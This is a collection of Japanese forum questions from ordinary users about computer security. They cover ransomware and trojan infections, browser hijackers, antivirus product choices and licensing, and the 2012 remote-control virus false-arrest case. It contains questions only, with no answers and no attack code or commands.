ランサムウェアに感染し、いくつかのファイルが拡張子.POLICEとなって開けなくなりました。 拡張子を直しても、ファイルは開けません。 おそらく症状から見て↓のランサムウェアに感染したようです。 http://about-threats.trendmicro.com/Malware.aspx … この場合、暗号化されたファイルを戻す方法はあるのでしょうか？ 感染時は、パソコンの調子自体がおかしくなり様々なアプリケーションが削除されたりしていましたがシステムの復元でなんとか元の状態まで戻りました。(ファイルは暗号化されたままですが) そもそもランサムウェアがパソコン上から削除されたかも定かではありません・・・(Mcafeeのフルスキャンでは何も出ませんでした)
僕の職場で使っているＰＣのマイネットワークの中にある共有フォルダの中には様々な情報が入っています。 最近、仕事の休み時間にそのＰＣを使って個人的な検索をしている人が目につきます。 こういったことを共有の情報の入ったＰＣですることはセキュリティ上は問題ないのでしょうか？（←質問１）共有内の情報が盗まれるようなことが起こるのではないかと怖くなりました。 そこで、共有の情報を使うＰＣではインターネット検索ができないようにして、業務上検索が必要な時は別の検索用のＰＣを設けてはどうかと思います。←こうすれば少しはセキュリティ強化につながるでしょうか？（←質問２） 以上2点を質問させて頂きます。セキュリティについてわからないことばかりで困っております。お詳しい方、とんちんかんな質問かもしれませんが、どうぞよろしくお願い致します。
会社PCにて、「AVG Internet Security Bussiness Edotion 2012」５台版 を使用していますが、１台だけ、「！再起動が必要」が出たままになっています。 再起動を何度行っても、同じ症状です。 アップデートの実行は完了していますが、「概要」の「アップデート」には 「アップデートには再起動が必要です」が出ています。 他の４台と画面も違っています。 AVG、それともOS自体の問題なのでしょうか。 PCは　DELL Precision T3500 W/S、OSは WindowsXP SP3です。 メモリは768MB搭載です。 だだし、メイン業務で使用しているものですので、OS再インストールは出来ません。 対処策をよろしくお願いします。
　 　感染警告が出ました。TuneUpUtiliesやRegCleanPuro を買わなくてはいけないと 常に画面にでてくるのですが、　どれを買えばいいのでしょうか。ウィンドウズ７を買ったばかりです。XPもあるのですがそちらの方には警告はでません。 　 　ウイルス対策はすべて有料なのでしょうか。 　
フリーソフトをダウンロードして使ったらウイルスに感染したと報じられています。 http://www.j-cast.com/2012/10/10149630.html フリーソフトをダウンロードして使うことはよくあるのですが、そのときウイルスに感染しないためにはどうしたらいいのでしょうか。ダウンロードした後でそのファイルのウイルスチェックをすればいいのでしょうか。
マニュアルを読み返してる時間がないので質問させていただきます。 ウイルスバスターコーポレートエディションサーババージョン10を使用しており、サーバが親になってクライアントPCにも数台インストールされています。 ただ、いくつかのPCにはMicrosoft Security Essentialをインストールさせており、そちらに移行したいと考えているのですが、クライアントからウイルスバスターをアンロードさせてもネットワークにいて時間が経つとまた自動的に再インストールされてしまいます。これを完全にアンロード（アンインストールしたいのですがどこからできますか？親のWebコンソールにはそのような設定箇所が見当たらないのですが・・・
自宅のパソコンの、Googleリボンの検索ボタンを押したところ 今まで閲覧したサイトの名前の間に、loc:で始まる約30桁の数字が何行も表示されました。 今までこのような数字は表示されたことがありません。 その文字列をクリックすると『一致する情報はみつかりません』というメッセージが出ます。 これって今問題になっている『なりすまし』では？ と心配になりました。 どなたか loc:ではじまる文字列の正体を教えていただけませんか？ 私のOSはWindows XPで、ウィルスセキュリティ ZERO を入れてあります。 また、最近フリーソフトをダウンロードしたり、怪しげなメールを開いたりはしていません。 どうかよろしくお願いいたします。
ウイルス対策ソフトとしてnoetonをインストールしたいのですが、インストールしたいPCにはCDドライブがついていません。インターネットで購入してダウンロードしたいと思ったのですができないのでしょうか？（nortonのサイトでは見つけられませんでした…） CDドライブとウイルス対策ソフト現品（店頭に並んでるパッケージ？）を購入してインストールするしかないのでしょうか？
カスペルスキーで、firefoxをセーフブラウザ化して使用しています。 OS は xp professional 32bit です。 ネットサーフィンによってダウンロードされるデータは C:\Documents and Settings\All Users\Application Data\Kaspersky Lab\SandBox\ 以下に保存され、\SandBoxフォルダ以下でマルウェアが実行されても、その悪影響はパソコンに及ぼさないと考えています。 http://okwave.jp/qa/q7383900.html ただ↑にあるように =================================================================== さて、キャッシュに関しては、Firefox11から仕様変更がありました。 Firefoxのオプション設定で「Firefoxの終了時に履歴を消去する」にチェックを入れて、更に履歴の消去設定ダイアログで「キャッシュ」にもチェックを入れているときには、ディスクキャッシュは使われずに、メモリキャッシュだけを使う仕様になりました。 ですからこの設定にしている場合は、キャッシュフォルダは生成されなくなりました。 ===================================================================== 通常ならcacheフォルダは、 C:\Documents and Settings\All Users\Application Data\Kaspersky Lab\SandBox\ 以下に形成されるので、マルウェアが実行されても問題ありません。 ただ、ディスクキャッシュではなく、メモリキャッシュだけに保存される場合、メモリキャッシュは C:\Documents and Settings\All Users\Application Data\Kaspersky Lab\SandBox\ の外(無関係な場所)にあるので、メモリキャッシュ上でマルウェアが実行された場合、パソコンに悪影響を及ぼしてしまうのでしょうか？ 私はfirefoxをセーフブラウザ化していたとはいえ、ディスクキャッシュは使用せず、メモリキャッシュだけに保存する状態でウェブサイトを見て回っていたので心配です。 ところでfirefoxでいうメモリキャッシュ(browser.cache.memory)とは、[cpuのキャッシュメモリ]か[メインメモリ]のどちらを指しているのでしょうか？
今メールでツイッターチェックしたらウイルスバスターが無効になっています。信頼できるサイトならこのまま続けますか？みたいなメッセージが出ました。 昨日まで普通で、有効期限も残っています。 ウイルスバスターのアイコンクリックして確かめてみても保護されていますと出ます。 設定等もいじっていません何故突然こんなメッセージが出たのでしょう。 最近、ホームページをヤフーからグーグルに変えました、これが何か影響している訳ないと思いますが、何故突然ウイルスバスター無効のメッセージが出たのか不安です。本当に保護されているのでしょうか？ 宜しくお願いします。
http://www.livedoor.com/にアクセスしたら画面が変になったので、消しました。 ライブドアがネットウイルスに感染してる可能性はあるのでしょうか？ 誰か確かめてください！
昨日、ＮＨＫのニュースで【殺人予告メールを送ったなどとして逮捕された男性２人のパソコンから「遠隔操作型ウイルス」が見つかった】と聞いたのですが。 どのようにして、ウイルスに感染したのでしょうか？メールから？怪しいサイトにアクセスしたから？何かをダウンロードしたから？全く分かりません・・・対策はあるのでしょうか？ ご回答、宜しくお願いしますm(__)m
このたびの大阪市のホームぺージなどのＰＣ乗っ取り事件ですが、報道の焦点が、誤逮捕釈放の方に偏っていますが、問題は誤逮捕された二人のＰＣがなぜウイルスに乗っ取られたかではないでしょうか？ どのようなウイルス対策ソフトを使っていたのか、またどのようなウイルス対策をしていたのか、などがあまり報道されていません。 私としては、被害にあったＰＣのウイルス対策状況がどのようなものであったかが、今後の事件再発防止策として大事ではないかと思いますし、知りたいのですが、いかがなものでしょうか？
ニュースで　特殊なウィルスでＰＣを乗っ取られ遠隔操作をされ爆破予告などのため逮捕、誤認で釈放というのがありました。ウィルスの内容や対策があまり公表されていません。 対策があるのなら　それを報道いていただきたいところですが　見つけていません。 一般の対策で防げるようなウィルスなら逮捕されてい方にも少しは非があるのかもしれませんが。 ただ　国の機関のＰＣも乗っ取られたり書き換えられたりしていますが　ウィルス対策だけでは防げないのものでしょうか。 この種のＰＣ乗っ取りは　通常のウィルス対策ソフトでは防げなかったのでしょうか。 あるいはＷｉｎｄｏｗｓ等のアップデートを自動でするように設定していれば防げるでしょうか。 またＰＣの設定でリモートさせさせないようにできる方法はあるでしょうか。
に　感染してました…:(；゛゜'ω゜'):　　で　取り敢えず　スキャン削除　(;゜Д゜)! ふぅー(　´∀｀)　　　　　　…　　　　…　　　…　　(-_-;)… トロイの木馬がＰＣに入った時点で　何かしら情報が漏洩していたのでしょうか?(~_~;) ＰＣに特に問題は無いです。　　 ウイルス対応ソフト・リアルタイム起動　　ＰＣ使用後に　任意ウイルススキャンと ウイルス対策は徹底的にやってます。w 今回　発見したウイルスは　win32.troj.generic.v　　です(・_・;)
http://headlines.yahoo.co.jp/videonews/ann?a=201 … 　この事件で逮捕されて釈放された方のパソコン設定はこの質問の画像にある設定を仕事の関係で有効にしていたからこのような結果になったのではないでしょうか？ 　この設定を無効にしていたら安全だったのではないでしょうか？ 　
先ほど、コンタクトリストに入っている方から『lol is this your new profile pic?～』というURLが送られてきてクリックしてしまい、圧縮されたファイルをDLしました。 解凍しても何も入っておらず、不審に思ってスカイプを見たら…同じURLが私のコンタクトの方、全員に送信されていました。 慌てて原因を検索しようとしてみてもインターネットが開けなくなり、他のパソコンで検索してみた結果、拡散系のウィルス？と知りました。 急いでコンタクトの方に送信されたURLを消去したものの、スカイプの設定をいじる度にコンタクトの方へURLが勝手に送信されてしまいます。 （その度にURLを消している状態です…。） 解決方法を検索してみたものの、パソコン初心者も同然なので分かりません！(>_<) 解決方法を御存じの方、分かりやすく教えて頂けると幸いです。 Windows Vista使用、スカイプは恐らく最新版を使用しています。 他に情報が必要であればお伝えしますので、ご回答宜しくお願い致します！！
最近いろいろな無料のセキュリティソフトがありますが、一番機能面で優れているのはどれでしょうか？ よろしくお願いします。
Windows7を使っているのですが、マカフィーをインストールしてはっきり機能しているにもかかわらず、OSのシステム診断レポート（リソースとパフォーマンスモニター）によると「セキュリティセンターでウィルス対策製品が記録されていません」と出ます。OSのアクションセンターでもマカフィーのセキュリティーセンターでも正常に機能しているように出ています。 どーしてでしょうか？
カスペルスキーで定期スキャンの設定方法はどうすればいいのでしょうか？ （リアルタイムスキャンでなく、「毎週日曜１３：００にスキャン」のように） よろしくお願いいたします。
あるファイルを開いたら＜「保護されたビュー」でひらかれています。＞ 　との表示されました。 　OSはWindows7です。　　セキュリティはavastを利用しています。（無料版） 　　　1ヶ月前ぐらいに、セキュリティスキャンをした際に「トロイの木馬」に感染しているという 表示され、その後、「安全に除去しました」との表示がありました。 これとの関係でしょうか。 それと、「保護されたビュー」で表示されたファイルは、必然的に破棄しなければダメなので しょうか。 このファイルは、重要ファイルで、できれば、そのまま利用したいのです。 もし、安全なファイルに作り変えることができる方法があるとすれば、その方法をアドバイス ください。 お忙しい中、どうぞよろしくお願いします。
ルータは使用せず、パソコン→インターネット　という環境でファイアウォールソフトはインストールしていると仮定します。 ブラウザでネットサーフィンをする場合、パソコンのポートを開かなければなりませんが、悪意のある人間によってそのポートから侵入されるということはないのでしょうか？ 侵入がブロックされるとすれば、パソコンのファイアウォールソフトでアウトバウンドに対応したインバウンドのみを通す設定にしている為、ネットサーフィン用に開放されているポートに悪意のあるアクセスがあってもブロックされるということでしょうか？
これはいったい何なのだ？ 昨日からスマホでネットをしていると上記の「リクエストした処理がタイムアウトしました。」という小窓が開いて来てうざいです。 閉じるボタンをクリックすれば消えますが、２０分～３０分間隔で立ち上がって来るので困っています。 更に今日は、自宅のデスクトップでも同じ「リクエストした処理がタイムアウトしました。」が出現したのでびっくりです。 スマホもPCもセキュリティー対策はちゃんとしているし、何故突然何の繋がりも無いスマホとPCに同じ自称が発生するようになったのか、何方か原因や対策をご存知の方がいらっしゃりましたらアドバイスをお願いいたします。 スマホもPCも再起動させても自称は治まりません。 ※、シャープ００３PとウインXP。 ※、スマホとPC間の接続やデーターの交換などは一切していません。 だいたい何もリクエストなんぞした憶えは無いのに「リクエストした処理がタイムアウトしました。」って、いったい何のことなのでしょうか？
《セキュリティーソフト 3年1台版》は、1台でも1年間でしょうか？ 1年ごとに（残りの）2つめ.3つめのライセンスキーに変えて3年間（無料で）使用することはできないでしょうか？ 宜しくお願いします。
《セキュリティソフト1台3年版》は、1台しか使用しなくても1年でしょうか？ 1年ごとに（残りの）2つめ～3つめのライセンスキーに変えることで3年間（無料で）使用することはできないでしょうか？ 宜しくお願いします。
テレビがウイルスに感染したなんて聞きません。なら、テレビの仕組みで作ったパソコンなら感染しませんよね？なぜ家電メーカーそういうパソコンを発売しないんでしょうか？
アンチウイルスやファイアウォールなどの入った統合セキュリティソフトを購入しようと考えています。 性能と企業が信頼できそうなのはもちろんですが、アクティベートの際に氏名や電話番号や住所などの詳細な個人情報を要求してこないものを選びたいのです。あれこれ個人情報を入力させられるのが何か腹立たしいので。 メジャーなものにありますかね。なければ御三家の中から選びますが。
ネットでサイトを閲覧していたところ、ウィンドウを閉じれなくなり無限ループしてしまいました。 仕方ないので強制てきにシャットダウンし再起動したところ、デスクトップ上にホームグループの アイコンがありました。 私自身設定等ホームグループに参加した覚えはありません。 これってウィルスによるものですか？セキュリティソフトの履歴を見ると中度のリスクを検知し遮断とありました。 ちょうど無限ループした時間帯くらいです。 仮にウィルスだとしたら私のPCがかってにホームグループに参加させられ、ファイル等見られている と言うことでしょうか・・・？ ホームグループに参加しているか否か確認できる方法等ありましたら教えて頂きたいです。 osはwin7です。
お世話になっております。 BTOパソコンを初購入したのですが、早速困っております。 私はSOHOでデザインの仕事をしているので、頻繁にadobeCSを使用します。 特にphotoshopなど動作が鈍くなるのは困るので、SSDにCSとOSと各ドライバーをインストールしてHDDにデータ類やマイドキュメント類やTEMP類を作成しようと思っています。 動作面を考えるとなるべくSSDのスペースに余裕を持たせたいので、CS以外のアプリケーションは、Dドライブにインストールしようと思っているのですが、AviraFreeAntivirusやPCtoolsなどのセキュリティソフトはやはりCドライブにインストールすべきなのでしょうか？ セキュリティソフトはウイルス定義の更新など頻繁に行われるので、データ＆書き込み回数が増えるイメージがあるので。。。 現状では下記の構成です。 //スペック// /windows7 professional 64bit・Intel Core i7-3770/ ・SSD　120GB 　Cドライブ　OS、マザボやグラボのドライバ ・HDDパーティション分割　 　Dドライブ:200GB　仮想メモリ、TEMP、IE、デスクトップ(一時増減があるモノ類)※他のブラウザやメールソフトやアプリもDに入れる予定 　Eドライブ:1500GB　マイドキュメント、マイピクチャ、マイビデオ、マイミュージック 　Fドライブ160GB　仕事用データ パソコンがが手元にきてから数日経つのですが、未だにセキュリティ面をクリアしていないので安心してインターネット使用が出来ずに困っております。 お手数とは思いますが、どなたかご教授ねがいます。
ウイルスバスターを「今すぐ更新」をクリックすると、「Windowsに同梱されていなかったプログラムを実行しようとしています。このプログラムを信頼していますか」と出るので、「はい、このプログラムを信頼し実行する準備ができています」をクリックしても何の変化もありません。 そして毎回パソコンを起動するとWindowsセキュリティセンターの「赤に白の×」がインジケーターに出ます。 Win　Vistaを使っています。 どうしたら最新に出来るのでしょうか。 教えてください。 宜しくお願い致します。
こウィルスバスターを昨日入れました 今日の朝パソコンを開いて閉じる際にシャットダウンの所がオレンジになっていてインストールしてから再起動となっていました インストールしてからなので更新プログラムを確認したら・・ 画像のようにインストールボタンを押したら 同意しますか 同意しませんかってなっていました 悪意あるソフトって ウィルスソフトを防止する今の場合ウィルスバスターのことなのだろうか？ 同意しないとインストールできないの？ ちなみに朝少し忙しくて シャットダウンしました そして今パソを開いたら 80個の数より減っていました 起動する際インストール何個中何個中って勝手に1000個以上インストールされていました これに同意すると 前みたいにパソコンの起動できないかとしんぱいになりました 実はこのパソコン新しいのですが・・ これに同意したのが関係あるのか否かは分かりませんが 軌道修正ばかり繰り返して 終いにブルースクリーンの中に白文字が立ち上がるという不具合が出たのです 新しいパソコンだったので 私のデーターもなにも入っていませんのでお店に又買った状態にしてもらったわけです 私が同意したばかりにこのよう表情が出たのかと心配で どうしたらいいかと思っています
機械音痴でちょっとよくわからないので質問させてください。 先日パソコンにウィルスが入ってしまいました。 駆除はしたのですが、その後何度もウィルスの表示が出るので、そのたびに駆除しています。スキャンしてみてもウィルスは検出されないので、おそらく駆除できているとは思うのですが・・・ iPhone5をパソコンにつなぎたいのですが、このままつないでも大丈夫でしょうか？スキャンでウィルスは検出されないものの、何度もウィルスの表示が出てくるので不安です。 もしこの状況で何か対策がありましたら教えていただきたいです。機械音痴でもわかるように教えてくださると嬉しいです。 あいまいな質問ですが、何かアドバイスがあれば回答よろしくお願いします。
３台までインストール可能とのことですが、 ３台目をスマートフォンにインストールすることは可能なのでしょうか。 ご存知の方、宜しくお願いします。
ウィルスバスター2012からウィルスバスター クラウドにアップグレード後、パソコンの動きが遅くなった。起動は遅くないが、起動後、ハードディスクがずっと動いている状態が続く。不思議なことに、再起動後は、普通の状態に戻る。仕方がないので、一回立ち上げて、再起動して使っている。 OSはWindows Vista ウィルスバスターのせいではない可能性もゼロではないが、明らかにアップグレード後の現象。 とても不思議な現象なので、理由が分かる方がいらっしゃればうれしいです。
　 　　この度、インターネット接続をフレッツ　ADSLからフレッツ光に変更することになりました。 　「光」に変えた場合でもADSL時に使っていた「ウイルスセキュリテイZERO」を使うことが 　可能でしょうか。
ウィルスバスターを使っています。 知人から無料のAVASTの方が性能がいいと聞きました。 有料より無料の方が性能がいいのですか？ 有料ソフトは有料ソフトなりに優れた箇所があるんでしょうか？
最近、検索ページからサイトに行こうとすると http://seekportals.com　のページに飛ばされてしまいます。 おそらく軽いウイルスか何かでしょが対策方法がわかりませんので教えていただきたいです よろしくお願いします
我が家のパソコンは「フレッツウイルスクリア」という、ウイルス対策ソフトを使っています。 これは、サイトの安全性を緑（安全）、赤（危険）、灰（評価なし）で表示してくれるのですが、この緑色はウイルスだけでなく、ワンクリック詐欺に対しても安全だと解釈して良いのでしょうか？
ウイルスセキュリティーソフトを使わないでインターネットに接続すると、怪しいサイトをひらかなくてもモデムやルーターのＩＰが流出してしまうというのは本当ですか？ 知り合いから聞いたのですが、どうやらグーグルやヤフーにアクセスしただけでも駄目らしいです！！
Winsows7を使っています。 先日Norton無料版の期限が切れたのでMcAfee無料版を入れたのですが、 その時にNortonをアンインストールせずにMcAfeeを入れてしまいました。 セキュリティソフトを二つ入れるとパソコンがおかしくなると聞いていますが、 期限が切れたものでもまずいでしょうか？ そのままでも大丈夫なのか、今すぐNortonをアンインストールするべきなのか、NortonだけをアンインストールするとMcAfeeにも支障が出るのでどちらもアンインストールするべきなのか、何が適切なのか分かりません。 詳しい方がいらしたら、ぜひ教えて下さい。
最近知ったのですが、インターネットエクスプローラーに不正アクセスに関する脆弱性が見つかりその対策として9月22日くらいに緊急補修パッチを配布(ダウンロード)することになったとネット上で知ったのですが、マイクロソフトのホームページで緊急補修パッチというものが見つかりません。ダウンロードしたいので、公式なダウンロード先のサイトを教えてください。ご回答お願いします。
昨日から“検索ウィンドウ”がいくつも開いてしまいます。 うかつなことにウィルスバスターをまだインストールしていなかったため ダメかとは思いつつその後インストールしてスキャンしましたがウィルスは 検出されませんでした。 ネットで調べた対策→ツールから「セキュリティ設定」ダイヤログの「スクリプト」の項目で「Javaアプレットのスクリプト」と「アクティブスクリプト」は「ダイヤログを表示する」を選択。こちらもすでに試しましたがダメでした。 どなたかお教え頂ければありがたいです。 どうぞよろしくお願い致します。
全然パソコンのことがわかっておらずお恥ずかしいのですが、教えていただきたいです（ ; ; ） 先日家庭内にWi-Fi環境が整い、iPhoneなどもサクサク使えるようになりました(^o^) そこで、無線でノートパソコンを買いたいと思ってるのですが、 パソコンって、買ったらウイルス対策をしなければいけないんですよね？ 今家にあるのは家族のパソコンで、ウイルス対策ソフト？(なにかを延長したなどと言っていたのですが)を私が買おうとしているノートパソコンでも使えるというのですが本当でしょうか？ それなら新しくソフト？を買うこともなく助かるのですが。 また、CDのようなものをパソコンに入れ、インストールすれば完了なのでしょうか？
　昔持っていたパソコン(WindowsXP)は、ウイルス感染しています。 　このパソコンからデータ移行をして、今持っているPCにデータを移行すると今のパソコンはどうなるのでしょうか？ 　また、データというのは、写真です。何か良い移行方法はありますでしょうか？ 　よろしくお願いします。
３年３台版で４３００円ですが何故こんなに安いんでしょうか？ 今買ったらアクティベーションは何年のバージョンで何年先まで有効なんでしょうか？ 再インストールの際台数はカウントされるのでしょうか？ 昔のバージョンは検出率が高く価格も高かった気がします。今は何故安いのか教えてください。
最新版をインストールしたところ オンランゲームをしていて調べたい事などあった際に ブラウザを開こうとするとブラウザがフリーズしてしまいます その逆でブラウザを開いたままゲームを起動させると ゲームは立ち上げでフリーズ、ブラウザもフリーズ （念のため以前のバージョンに戻したところ何も問題なし） 現在このような状況なのですが ここで質問です ゲーム起動はデスクトップにあり プロパティで インストール先もわかるのですが 例外設定→参照→ここからどうすればよいかわかりません どうぞよろしくお願いいたします。
フリーのセキュリティソフト「Microsoft Security Essentials」　を使ってみたいのですが実際にお使いになった方、トラブルはありませんでしたか。教えてください。
i-フィルター5.0についてはインストールした覚えがありませんが突然動作を停止したと表示が出ました 私はマカフィのセキュリティを入れていますが別のものでしょうか
ウィルスバスターの最新版を使っています。 windows7で、IE9です。 とあるリンクをクリックすると、setup.exeをダウンロードしますか？というダイアログが画面下に表示されました。(ファイル名はうろ覚え) exeファイルをむやみにダウンロードするのはよくないと思ったので、キャンセルを押しましたが、ダイアログは消えません。何度か押しましたが無反応でした。 仕方がないので、ダイアログ右上の×印を押して消したところ、(しばらくして？)ウィルスバスターによって「再起動しないと、setup.exeがコンピュータに危険を及ぼす」？みたいなダイアログが表示されたので、再起動しました。 絶対にダウンロードの保存ボタンは押していないのですが、再起動後同じリンクをクリックして同様の操作を行ったところ、再び再起動を要求されることとなりました。 これはなぜですか？ できるだけ詳しく原因をお教え願います。
自分のPCがどうやら暴露型ウィルス（おそらく山田オルタナティブと思っています）に感染したのですが、確認する前に、PCを初期化してしまいました。それで山田ウィルスで暴露された情報やデータなどはどうやって確認するか教えていただけないでしょうか？。少し調べてみたところ２ｃｈの厨房板に宇宙語のような、文字で張り付けられるとかかれているのですが、それらしきものを探しているのですがみあたりません。どうやって確認できるででしょうか？。それとなく教えてくれた友人に自分の過去の閲覧履歴やその他のことがばれていると思うと怖くて聞けません。どなたか詳しい方教えていただけませんでしょうか？
NTTが提供しているサービスでフレッツウイルスクリアは ウイルス対策として効果はありますか？個人的な意見でもいいのでお願いします。 よろしくお願い致します。
NTTが提供しているサービスでフレッツウイルスクリアは ウイルス対策として効果はありますか？個人的な意見でもいいのでお願いします。 よろしくお願い致します。
IEに深刻な脆弱性があるようです。現在対策はなし、出来るだけIEは使わないようになんて無茶なことが言われています。 ここでは一部の人からカスペルスキーの優秀性が喧伝されています。このIEに対しては有効でしょうかそれとも無力でしょうか。
今YahooのADSLですがセキュリティはBBセキュリティを利用しています。月々598円です。高いと思っているので別のサービスに変えようと思っているのですが必要ないのではとも思っています。セキュリティサービスというのは僕のようなネットサーフィンと動画を見る事位しかやらない者でも絶対に入ってなきゃいけないものなのでしょうか？
最近，たまに（1日に何回か）パソコンでノックするような音が三回（コンコンコン、といった感じ）します。 特に不自然な動作はしていないようですが、これはウィルスか何かでしょうか？
インターネットセキュリティーは3台インストールできますが。 現状は2台のパソコンにインストール済み。 ノートンアカウントで見ると利用可能なインストールは1です（当然）。 この内の1台を売却するので、アンインストールしましたが。 利用可能なインストールが1のままです。 なぜ２にならないのですか？ 1回パソコンにインストールしたら1回インストールとカウントされて、 アンインストールしても利用可能数は増えない？？
babylon にシステムを食い荒らされ、 たくさんの方からの情報をもとに治療を行いましたが、 とうとう救い出すことはできませんでした。 （協力された方々にあえてお礼申し上げます） その後 babylon により病死したシステムを根元から剥ぎ取り初期へと戻しました。 では babylon からシステムを救い出した方やアドバイスされた方は、 一度 babylon に襲われたと思います。 では何が原因またはどこで babylon に襲われたかわかりますか？ 今後憎き babylon に食われないためにも対策の一つとして知っておきたいです。 どんな情報でもいいですから、知る限り教えてください。
職場でUSBメモリが使用禁止となりそうです。データ流出をさけるためらしいですが、家で仕事をすることも多くそのデータのやりとりは今後どういう方法が考えられるでしょうか。ネットストレージは無理なようです。
両親が、西日本にいまして、 フレッツ光の契約をしました。 その際、パソコンのインターネットの設定　NTT西日本セキュリティ対策ツールの 設定を、業者さんに頼んでしてもらうのですが、 NTT西日本のセキュリティ対策ツールをしても、スカイプはできますか、 ノートパソコンでスカイプの入ったもので、設定してもらいます。 アカウントも作っています。 セキュリティソフトがあるので、スカイプできないとなったら、だめなので、 不安です。 ちなみに、両親とは離れてくらしておりまして、 スカイプで通話しています。
少し前にインターネットが酷く遅くなり、ある裏のウインドウで開いているページを閉じるとまた快適に動きはじめました。 しばらくしてメニューバーのファイル→新規ウインドウを選択しましたら、エラーが起きて、直前のページを表示するかといった選択の画面が出てきました。 「直前のページを表示する」を選択するともうとっくに見終わって閉じたはずの昨日の見た事あるようなサイトのページが閉じても閉じても数種類も表示され閉じては他のページが現れといった現象がみられました。 何回か繰り返すと終わりましたが、ウイルスにでも感染したかなと思ってしまいました。 とりあえず、ＮＴＴのセキュリティ対策ツールで「検索」のみはかけておきましたが、 これからしておくべきことと、起こりうることなどありましたら、おねがいします。
数時間前、１０分ほどPCの前を離れ、帰ってくると開いてあった IEが明滅していたため、強制終了から再起動で元に戻しました。 今、考えるとIEが連続で開かれていたのかなと思います、 その後メールの通知で、 こんにちは、○○○○ Twitter アカウント (@-------) のパスワードがリセットされました。 If you did not make this change and believe your Twitter account has been compromised, please contact Twitter support by clicking this link: https://support.twitter.com/forms/hacked Thank you, Twitterセキュリティ と、送られてきていました clicking this linkでサポートにとび、 アカウントがハッキングまたは乗っ取られました。 こちらでサポートいたします。 どのような問題ですか? アカウントがハッキングまたは乗っ取られています。 .あなた以外の誰かがアカウントにアクセスしていますか? その場合は、次の手順に従ってください。 1.パスワードをリセットする メールアドレス、電話番号またはユーザー名をパスワードリセットフォームに入力してパスワードをリセットしてください。 2.アプリ連携を無効にする ログインしている状態で、アカウント設定の [アプリ連携] タブをご覧ください。許可した覚えのないサードパーティのアプリケーションからのアクセスをすべて取り消してください。 とのことだったので、１、２を実行し現在に至るのですが、 サードパーティのアプリケーションからのアクセスは、ありませんでした。 全く知らないフォロワーがあり、とりあえず削除させてもらいました。 そこで質問なのですが、ハッキングにあうなどということは、初めてなので 知識もスキルもありません。 １０分程度の間に、Twitterのアカウントのハックだけで終っているのでしょうか あるいは、PC内の各種情報までハックされているのでしょうか。 PCは、WIN7　Pro、 回線はNTT光、セキュリティーはNTT対策ツールです。 尚、Twitterは２、３日前に始めたばかりでした。何卒よろしくお願いいたします。 . . . . . . . .. . . . . . . . . .
こんにちは。 ウィルスバスター2012クラウドを使用しています。 ウィルスバスター2012クラウドからウィルスバスタークラウドへの変更なのですが、何日か経過すると自動的にウィルスバスタークラウドへ変更してくれるのでしょうか？。 それとも自分でウィルスバスタークラウドをダウンロードしてインストールしなければらならいのでしょうか？。 もし、ご存じの方が居られましたら、よろしくお願いいたします。
MSやその信仰者の意見「サポート切れOSは使うな」を守る人はきわめて少数派だと思います。壊れても無いPCを買い換える人は常識で考えていません。 MSはXPのサポート期限をふたたび延長するんでしょうか？セキュリティソフトは期限切れXPをサポートするんでしょうか。どうなると予想するか教えてください。
現在はトレンドマイクロ社のウイルスバスターを使ってます。３年契約がもうすぐ切れて更新を迎えているのですが、セゾンカードの永久不滅コムで提供されている「永久不滅セキュリティソフト」という無料のウイルス対策ソフトがあります。中身はKINGSOFT製なのですが、無料のソフトでも大丈夫ですか？一応、セゾンカードという大きな会社が提供するものなので変なものではないと思うのですが、なんとなく「無料」というのに不安があります。 ウイルスバスターはネットを始めた時から使っているので１０年以上使い続けています。３台まで導入できるようになったので継続していたのですが、無料ならこれも問題無いです。 これまでウイスルに感染したことはありません。ウェブサイトで危険なページが指摘されることはあります。 ネットショッピングをよく利用しているのでカード情報が盗まれたりしたら大変困ります。 また、基本的に窓の杜やベクターでフリーソフトを利用して価格のあるソフトの代わりに使っているので、やはりきちんと効果のあるセキュリティソフトが欲しいです。 自分でもいろいろ調べはしたのですが、評価がサイトによって正反対になったりするので判断しきれませんでした。 アドバイスお願いします。
ソースネクストがばらまいているウイルスセキュリティZEROについて 軽い　と宣伝されてますが　よい印象だけ取り扱うのが店。 ZEROの悪いウワサ、実例を知りたいです 今　実際に使用中ですが　頻繁に右下に沸く窓がうざいです・・・
ノートPC Eee PC901シリーズを使用しています。OSはXP。 最近になってからなのですが、PCの近くで盗聴波スキャンをすると 27MHzを検出します。 使用中はAC駆動でもバッテリー駆動でも検出します。 シャットダウン中は、ACアダプターのコンセントを差したままだと検出します。 シャットダウン中に、ACアダプターのコンセントを抜くと検出しません。 シャットダウン中に、PCとACアダプターを切り離して、ACアダプターだけ 電源につないでも検出しません。 ネットブックなので無線LANと接続する機能はあります。 考えられる事、対処法などありましたらお教え下さい。
ブラウザでFreFoxを使用しているのですが、 babylonがどうしても消えません。 いままでも　Revo Uninstaller　で完全アンイストールを試みたのですが、 リスト上から消えただけで、トップページからは消えません。 次に　システムの復元　や　　FireFox　を再インストールしてみましたが、 期待した変化は得られませんでした。 エラーチェックも行いましたがエラーは発見できず、不安に満ちて非常に困っています。 確実に babylon を退治する方法を教えてください。 できれば各ステップにわけて教えてください。 ブラウザ：Firefox　検索サイト：google
中古ノートPC(XP）を使っています。購入後すぐ有料のウイルス対策ソフトを入れて、 完全スキャンしましたが問題なしでした。その後も毎日スキャンしています。 先日、光学ドライブにメーカー製のプログラムCDを入れたら、\D:に「ウイルス検出、駆除 したが一部が残った可能性もある」の警告が出ました。 調べたらトロイ系で、危険度は「低」でした。すぐCDを取り出して、セーフティモードで再起動 して、ファイルを調べてシステムの完全スキャンをして、別メーカーのオンラインスキャン でもダブルチェックしましたが不検出で、その後も不検出です。 光学ドライブを使ったのは３度だけで、最初はWIN用のプログラムCDのインストール、 次はレンタルの映画を１回見ました。全部読み取り専用で、海賊版ではない正規版です。 プログラムCDは、２つとも自分以外の人は使っていません。 \D:への感染は何が原因と考えられますか?　 いまはUSBの抜き差しも一応やめているのですが、やっても構わないでしょうか?　 詳しい方、宜しくお願いしますm(__)m
こんばんは　よろしくお願いします 先月８月２０日から　私のデスクトップパソコンのインターネットが 止まってしまいました。プロバイダに問い合わせたところ　このパソコンの ウイルスセキュリティソフト（マカフィー）の最新更新定義ファイルに問題あるかもしれません とのことでした　マカフィーのHPでも同様の問題が発生しているとの事ですが 私のマカフィーソフトは　MSNエクスプローラーに無料で付属するものです（重要かも。。。） 私はまず　マカフィー関連のソフトウエアを全部削除に成功したのですが MSNエクスプローラーでのマカフィー再インストールの方法が解りませんでした どなたかMSNプレミアムに無料で付随するマカフィーの再インスト方法をご教授下さいませ
